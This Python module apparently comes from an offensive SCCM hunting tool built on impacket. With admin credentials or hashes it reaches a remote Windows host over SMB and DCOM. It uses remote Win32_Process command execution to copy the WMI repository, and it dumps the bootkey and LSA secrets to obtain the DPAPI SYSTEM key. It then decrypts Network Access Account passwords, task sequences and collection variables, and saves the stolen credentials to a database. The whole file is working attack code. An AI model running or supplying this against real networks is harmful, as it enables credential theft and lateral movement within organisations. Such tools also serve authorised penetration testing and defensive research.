# Original Script: https://github.com/ThePorgs/impacket/blob/master/examples/SystemDPAPIdump.py
# Module Author: @s1zzzz

import logging
import ntpath
import re
import sys
import sqlite3
import time
from binascii import unhexlify, hexlify
from io import BytesIO
from getpass import getpass

from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dpapi import MasterKeyFile, MasterKey, DPAPI_BLOB
from impacket.examples.secretsdump import RemoteOperations, LSASecrets
from impacket.smbconnection import SMBConnection, SessionError
from impacket.uuid import bin_to_string

from lib.logger import logger


class DPAPIHunter:
    def __init__(self, remoteName, username=None, password='', domain='', kerberos=False,
                 no_pass=False, hashes=None, aesKey=None, debug=False, kdc=None, logs_dir=None, wmi=True, disk=False, both=False):

        self.target = remoteName
        self.username = username
        self.password = password
        self.domain = domain
        self.doKerberos = kerberos or aesKey is not None
        self.no_pass = no_pass
        self.hashes = hashes
        self.aes = aesKey
        self.debug = debug
        self.kdc = kdc
        self.logs_dir = logs_dir

        self.dumpAll = both
        self.dumpWmi = wmi
        self.dumpDisk = disk
        

        if self.hashes:
            if self.hashes.find(":") != -1:
                self.lmhash, self.nthash = self.hashes.split(':')
            else:
                self.nthash = self.hashes
        if not (self.password or self.hashes or self.aes or self.no_pass):
            self.password = getpass("Password:")


        self.smb = SMB(self.target, self.username, self.password, self.domain, self.doKerberos, self.no_pass, self.hashes, self.aes, self.debug, self.kdc)
        self.dpapi = DPAPI(self.target, self.username, self.password, self.domain, self.doKerberos, self.no_pass, self.hashes, self.aes, self.debug, self.kdc, self.smb)        
        self.wmi = WMI(self.target, self.username, self.password, self.domain, self.doKerberos, self.no_pass, self.hashes, self.aes, self.kdc, self.dpapi, self.logs_dir)

    def run(self):
        if self.dumpAll:
            self.dump_wmi()
            self.dump_disk()
        elif self.dumpWmi:
            self.dump_wmi()
        elif self.dumpDisk:
            self.dump_disk()
        else:
            logger.info("[-] No operation specified")
        
        self.cleanup()
        
    def dump_wmi(self):
        print()
        logger.info("[*] Starting SCCM secrets extraction via WMI\n")
        
        # https://github.com/garrettfoster13/sccmhunter/pull/32
        namespace = 'root\\ccm\\Policy\\Machine\\ActualConfig'

        iWbemServices = self.wmi.connect_to_namespace(namespace)

        queries = [
            'SELECT NetworkAccessUsername, NetworkAccessPassword FROM CCM_NetworkAccessAccount',
            'SELECT TS_Sequence FROM CCM_TaskSequence',
            'SELECT Name, Value FROM CCM_CollectionVariable'
        ]

        for query in queries:
            iEnum = iWbemServices.ExecQuery(query)
            self.wmi.parseReply(iEnum)     

        if self.wmi.found_naa_credentials is False and self.wmi.found_task_sequence is False and self.wmi.found_collection_variables:
            logger.info(f"[!] No SCCM secrets found using WMI, try -disk dump")
            #return # would exit, but possibility of disk dump
        else:
            logger.debug(f"[*] Got SCCM secrets from WMI namespace '{namespace}'")
        
        print()
        logger.info("[*] WMI SCCM secrets dump complete")
        self.wmi.disconnect()
        return      

    def dump_disk(self):
        print()
        logger.info("[*] Starting SCCM secrets extraction from disk\n")

        self.wmi.connect_to_dcom()

        share = 'C$'
        original_filepath = 'Windows\\System32\\wbem\\Repository\\OBJECTS.DATA'
        filename = 'OBJECTS.DATA'       

        logger.debug(f"[*] Copying the OBJECTS.DATA file to C:\\Windows\\Temp\\{filename}")
        
        self.wmi.exec(f"cmd.exe /Q /c copy \"C:\\{original_filepath}\" \"C:\\Windows\\Temp\\{filename}\"")
        time.sleep(2)
        
        temp_filepath = 'Windows\\Temp\\'
        data = self.smb.getFileContent(share, temp_filepath, filename)

        result = self.parseFile(data)

        if result:
            logger.info("[*] SCCM secrets dump complete")     
        else:
            logger.info("[!] No SCCM secrets found in CIM Repository.")
        
        logger.debug("[*] Deleting the OBJECTS.DATA file from C:\\Windows\\Temp")
        self.wmi.exec(f"cmd.exe /Q /c del \"C:\\Windows\\Temp\\{filename}\"")

    def parseFile(self, data) -> None:

        foundCreds = False
        
        if(data is None):
            logger.info("[!] Unable to retrieve the OBJECTS.DATA file.")
            return

        regex_dict = {
            "NAA Credentials": br"CCM_NetworkAccessAccount.*<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>",
            "Task Sequences": br"</SWDReserved>.*<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>",
            "Collection Variables": br"CCM_CollectionVariable\x00\x00(?P<CollectionVariableName>.*?)\x00\x00.*<PolicySecret Version=\"1\"><!\[CDATA\[(?P<CollectionVariableValue>.*?)\]\]><\/PolicySecret>",
            "Other Secrets": br"<PolicySecret Version=\"1\"><!\[CDATA\[(?P<OtherSecret>.*?)\]\]><\/PolicySecret>"
        }
        
        for sccm_data_type, regex in regex_dict.items():
            logger.debug(f"[*] Looking for {sccm_data_type}")

            pattern = re.compile(regex, re.MULTILINE | re.IGNORECASE)
            matches = list(pattern.finditer(data))

            if matches:
                logger.info(f"[+] Found {sccm_data_type}")
                foundCreds = True

                for match in matches:
                    match sccm_data_type:
                        case "NAA Credentials":
                            naa_username = self.dpapi.decrypt_blob(unhexlify(match.group(2))[4:])
                            naa_password = self.dpapi.decrypt_blob(unhexlify(match.group(1))[4:])
                            SCCMSecret("NAA", naa_username, naa_password).dump(self.logs_dir)
                        case "Task Sequences":
                            task_sequence = self.dpapi.decrypt_blob(unhexlify(match.group(1))[4:])
                            SCCMSecret("Task Sequence", None, task_sequence).dump()
                        case "Collection Variables":
                            SCCMSecret("Collection Variable", match.group(1).decode('utf-8'), self.dpapi.decrypt_blob(unhexlify(match.group(2))[4:])).dump()
                        case "Other Secrets":
                            try:
                                logger.info(f"\t- Plaintext secret: {self.dpapi.decrypt_blob(unhexlify(match.group(1))[4:])}")
                            except:
                                continue
            else:
                continue
        
        return foundCreds

    def cleanup(self):
        if self.smb:
            self.smb.disconnect()

class DPAPI:
    def __init__(self, remoteName, username=None, password='', domain='', kerberos=False,
                 no_pass=False, hashes=None, aesKey=None, debug=False, kdc=None, smb_instance=None):
        
        
        self.target = remoteName
        self.username = username
        self.password = password
        self.domain = domain
        self.doKerberos = kerberos or aesKey is not None
        self.no_pass = no_pass
        self.hashes = hashes
        self.aes = aesKey
        self.debug = debug
        self.kdc = kdc

        self.dpapiSystem = {}
        self.smb = smb_instance

        self.raw_masterkeys = {}
        self.masterkeys = {}

        self.share = 'C$'
        self.mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\'
        self.tid = self.smb.smb_conn.connectTree(self.share)

        self.bootKey = None
        self.remote_ops = None
        self.lsa_secrets = None 

    def triage_masterkey(self, mkid = None):
        
        try:
            # retrieve masterkey file contents
            logger.debug("[*] Retrieving masterkey file: " + mkid)
            self.raw_masterkeys[mkid] = self.smb.getFileContent(self.share, self.mk_path, mkid)
            
            # if we can't retrieve the masterkey file, we exit
            if self.raw_masterkeys[mkid] is None:
                logger.info(f"[!] Could not get content of masterkey file: {mkid}, exiting since we can't decrypt the blob.")
                self.smb.smb_conn.disconnectTree(self.tid)
                sys.exit(1)
            
            # if we can retrieve the masterkey file, then we proceed to extract the bootkey
            logger.debug("[*] Attempting to extract bootkey from the target machine")
            try:
                self.remote_ops = RemoteOperations(
                    self.smb.smb_conn, self.doKerberos, self.kdc)
                self.remote_ops.enableRegistry()
                self.bootKey = self.remote_ops.getBootKey()
            except Exception as e:
                logger.info('[!] RemoteOperations failed: %s' % str(e))
            
            
            # with the bootkey, we can now extract LSA Secrets
            logger.debug('[*] Attempting to dump LSA secrets from the target machine')
            try:
                SECURITYFileName = self.remote_ops.saveSECURITY()
                self.lsa_secrets = LSASecrets(SECURITYFileName, self.bootKey, self.remote_ops,
                                            isRemote=True, history=False,
                                            perSecretCallback=self.getDPAPI_SYSTEM)
                self.lsa_secrets.dumpSecrets()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logger.info('[!] LSA hashes extraction failed: %s' % str(e))
            
            self.cleanup()          
            
            # debug, print SYSTEM user key
            # logger.debug(f"User Key: {self.dpapiSystem['UserKey']}")
            # logger.debug(f"Machine Key: {self.dpapiSystem['MachineKey']}")
            

            # now that we have the SYSTEM user key, we can decrypt the masterkey
            if self.dpapiSystem['UserKey'] is None:
                logger.info(
                    "[!] Could not retrieve the SYSTEM user key, exiting since we can't decrypt the blob.")
                self.smb.smb_conn.disconnectTree(self.tid)
                return
            for k, v in self.raw_masterkeys.items():
                if v is None:
                    self.masterkeys[k] = None
                    continue
                data = v
                mkf = MasterKeyFile(data)
                data = data[len(mkf):]
                if not mkf['MasterKeyLen'] > 0:
                    logger.info("[!] Masterkey file " + k +
                                " has no masterkeys, skipping.")
                    continue
                mk = MasterKey(data[:mkf['MasterKeyLen']])
                data = data[len(mk):]
                decrypted_key = mk.decrypt(self.dpapiSystem['UserKey'])
                if not decrypted_key:
                    logger.info("[!] Failed to decrypt masterkey " + k + ", skipping.")
                    continue
                logger.debug("[*] Decrypted masterkey " + k + ": 0x" + hexlify(decrypted_key).decode('utf-8'))
                self.masterkeys[k] = decrypted_key
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logger.info(e)
            try:
                self.cleanup()
            except:
                pass
        
        #self.cleanup()
        
        return

    def decrypt_blob(self, dpapi_blob=None) -> str:      

        # Identify the masterkey from the blob
        blob = DPAPI_BLOB(dpapi_blob)
        mkid = bin_to_string(blob['GuidMasterKey'])
        
        # If we don't have the masterkey, we triage it
        if mkid not in self.raw_masterkeys:
            self.triage_masterkey(mkid)
        
        key = self.masterkeys.get(mkid, None)
        if key is None:
            logger.info("[!] Could not decrypt masterkey " + mkid)
            return None
        
        
        decrypted = blob.decrypt(key)
        decoded_string = decrypted.decode('utf-16le').replace('\x00', '').replace('\\\\', '\\')
        
        #logger.info(f"Decrypted SCCM secret: {decoded_string}")
        return decoded_string

    def cleanup(self):
        if self.remote_ops:
            self.remote_ops.finish()
        if self.lsa_secrets:
            self.lsa_secrets.finish()

    def getDPAPI_SYSTEM(self,_, secret):
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split('\n')
            machineKey = machineKey.split(':')[1]
            userKey = userKey.split(':')[1]
            self.dpapiSystem['MachineKey'] = unhexlify(machineKey[2:])
            self.dpapiSystem['UserKey'] = unhexlify(userKey[2:])

class SCCMSecret:
    def __init__(self, item_type, key, value) -> None:
        self.item_type = item_type
        self.key = key
        self.value = value

    def dump(self, logs_dir=None) -> None:
        if self.item_type == "NAA":
            logger.info(f"\t- NetworkAccessUsername: {self.key}")
            logger.info(f"\t- NetworkAccessPassword: {self.value}")
            self.write_to_db(self.key, self.value, logs_dir)
        elif self.item_type == "Task Sequence":
            logger.info(f"\t- Task Sequence: {self.value}")
        elif self.item_type == "Collection Variable":
            logger.info(f"\t- CollectionVariableName: {self.key}")
            logger.info(f"\t- CollectionVariableValue: {self.value}")

    def write_to_db(self, username, password, logs_dir=None):
        source = "DPAPI NAA"
        database = f"{logs_dir}/db/find.db"
        conn = sqlite3.connect(database, check_same_thread=False)
        cursor = conn.cursor()
        check = "select * from Creds where Username = ?"
        cursor.execute(check, (username,))
        exists = cursor.fetchone()
        if not exists:
            cursor.execute(f'''insert into Creds (Username, Password, Source) values (?,?,?)''', (username, password, source))
            conn.commit()
        return

class SMB:
    def __init__(self, remoteName, username=None, password='', domain='', kerberos=False,
                 no_pass=False, hashes=None, aesKey=None, debug=False, kdc=None):

        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ""
        self.nthash = ""
        self.aesKey = aesKey
        self.target = remoteName
        self.kdcHost = kdc
        self.doKerberos = kerberos or aesKey is not None
        self.hashes = hashes
        self.no_pass = no_pass
        self.hashes = hashes

        self.smb_conn = None

        
        self.connect()
        self.is_admin()

    def connect(self) -> SMBConnection:
        try:
            logger.debug(f"[*] Establishing SMB connection to {self.target}")
            self.smb_conn = SMBConnection(self.target, self.target)
            if self.doKerberos:
                logger.debug("[*] Performing Kerberos login")
                self.smb_conn.kerberosLogin(self.username, self.password, self.domain, self.lmhash,
                                               self.nthash, self.aesKey, self.kdcHost)
            else:
                logger.debug("[*] Performing NTLM login")
                self.smb_conn.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
        except OSError as e:
            if str(e).find("Connection reset by peer") != -1:
                logger.info(f"SMBv1 might be disabled on {self.target}")
            if str(e).find('timed out') != -1:
                raise Exception(f"The connection is timed out. Port 445/TCP port is closed on {self.target}")
            return None
        except SessionError as e:
            if str(e).find('STATUS_NOT_SUPPORTED') != -1:
                raise Exception('The SMB request is not supported. Probably NTLM is disabled.')
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.debug(str(e))
        
        #logger.debug("[*] SMB Connection Established!")
        return self.smb_conn

    def disconnect(self):
        logger.debug(f"[*] Closing SMB connection to {self.target}")
        self.smb_conn.logoff()

    def is_admin(self) -> bool:
        try:
            self.smb_conn.connectTree('C$')
            return True
        except Exception:
            logger.info(f"[-] User {self.username} is not an admin on {self.target}")
            sys.exit(1)

    def getFileContent(self, share, path, filename) -> bytes:
        content = None
        try:
            fh = BytesIO()
            filepath = ntpath.join(path,filename)
            self.smb_conn.getFile(share, filepath, fh.write)
            content = fh.getvalue()
            fh.close()
        except:
            return None
        return content

class WMI:
    def __init__(self, remoteName, username=None, password='', domain='', kerberos=False,
                 no_pass=False, hashes=None, aesKey=None, kdc=None, dpapi_instance=None, logs_dir=None):
        self.target = remoteName
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ""
        self.nthash = ""
        self.aesKey = aesKey
        self.kdcHost = kdc
        self.doKerberos = kerberos or aesKey is not None
        self.hashes = hashes
        self.no_pass = no_pass

        self.dpapi = dpapi_instance
        self.logs_dir = logs_dir
       
        self.found_naa_credentials = False
        self.found_task_sequence = False
        self.found_collection_variables = False

        self.dcom = None
        self.connect_to_dcom()

    def connect_to_dcom(self):
        try:
            logger.debug(f"[*] Establishing DCOM connection to {self.target}")
            self.dcom = DCOMConnection(self.target, self.username, self.password, self.domain, self.lmhash, self.nthash,
                                       self.aesKey, oxidResolver=True, doKerberos=self.doKerberos, kdcHost=self.kdcHost)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            sys.exit(1)

    def connect_to_namespace(self, namespace) -> wmi.IWbemServices:
        try:
            logger.debug(f"[*] Connecting to WMI namespace: {namespace}")
            iInterface = self.dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
            iWbemLevel1Login.RemRelease()
            return iWbemServices
        except Exception as e:
            if type(e) is wmi.DCERPCSessionError and e.error_code == 0x8004100e:
                logger.info(f"[!] Unable to find the '{namespace}' namespace, this usually means there is no SCCM configuration on the machine.")

            self.dcom.disconnect()
            sys.exit(1)

    def exec(self, command):
        try:
            self.connect_to_dcom()
            logger.debug(f"[*] Executing command via WMI: {command}")
            iInterface = self.dcom.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            self.iWbemServices = iWbemLevel1Login.NTLMLogin(
                '//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()
            self.win32Process, _ = self.iWbemServices.GetObject('Win32_Process')
            self.win32Process.Create(command, "C:\\", None)
            self.iWbemServices.disconnect()
            self.dcom.disconnect()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            self.dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)
        logger.debug("[*] WMI Command Execution Finished!")

    def query(self, namespace, query) -> wmi.IEnumWbemClassObject:
           
        try:
            logger.debug(f"[*] Querying WMI Namespace: {namespace}")
            iInterface = self.dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
            iWbemLevel1Login.RemRelease()
            iEnum = iWbemServices.ExecQuery(query)
            return iEnum

        except Exception as e:
            if type(e) is wmi.DCERPCSessionError and e.error_code == 0x8004100e:
                logger.info("[!] WMI namespace not found")
            try:
                self.dcom.disconnect()
            except:
                pass
    
    def disconnect(self):
        logger.debug(f"[*] Closing DCOM connection to {self.target}")
        try:
            if self.dcom:
                self.dcom.disconnect()
        except KeyError as e:
            logger.error(f"Failed to disconnect DCOM connection: {e}")

    def parseReply(self, iEnum):

        regex = r"<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"

        while True:
            try:
                pEnum = iEnum.Next(0xffffffff,1)[0]
                record = pEnum.getProperties()

                if 'NetworkAccessUsername' in record and 'NetworkAccessPassword' in record:
                    
                    if self.found_naa_credentials is False:
                        self.found_naa_credentials = True
                        logger.info("[+] Found NAA credentials")

                    unparsed_network_access_username = record.get('NetworkAccessUsername', {}).get('value', None)
                    unparsed_network_access_password = record.get('NetworkAccessPassword', {}).get('value', None)
                    username_decrypted  = self.dpapi.decrypt_blob(unhexlify(re.match(regex, unparsed_network_access_username).group(1))[4:])
                    password_decrypted  = self.dpapi.decrypt_blob(unhexlify(re.match(regex, unparsed_network_access_password).group(1))[4:])
                    SCCMSecret("NAA", username_decrypted, password_decrypted).dump(self.logs_dir)

                if 'TS_Sequence' in record:

                    if self.found_task_sequence is False:
                        self.found_task_sequence = True
                        logger.info("[+] Found Task Sequence")
                
                    unparsed_task_sequence = record.get('TS_Sequence', {}).get('value', None)
                    task_sequence_decrypted = self.dpapi.decrypt_blob(unhexlify(re.match(regex, unparsed_task_sequence).group(1))[4:])
                    SCCMSecret("Task Sequence", None, task_sequence_decrypted).dump()

                if 'Name' in record and 'Value' in record:

                    if self.found_collection_variables is False:
                        self.found_collection_variables = True
                        logger.info("[+] Found Collection Variables")

                    collection_name = record.get('Name', {}).get('value', None)
                    unparsed_collection_value = record.get('Value', {}).get('value', None)
                    collection_value_decrypted = self.dpapi.decrypt_blob(unhexlify(re.match(regex, unparsed_collection_value).group(1))[4:])
                    SCCMSecret("Collection Variable", collection_name, collection_value_decrypted).dump()

            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                if str(e).find('S_FALSE') < 0:
                    raise
                else:
                    break

        iEnum.RemRelease()

        return
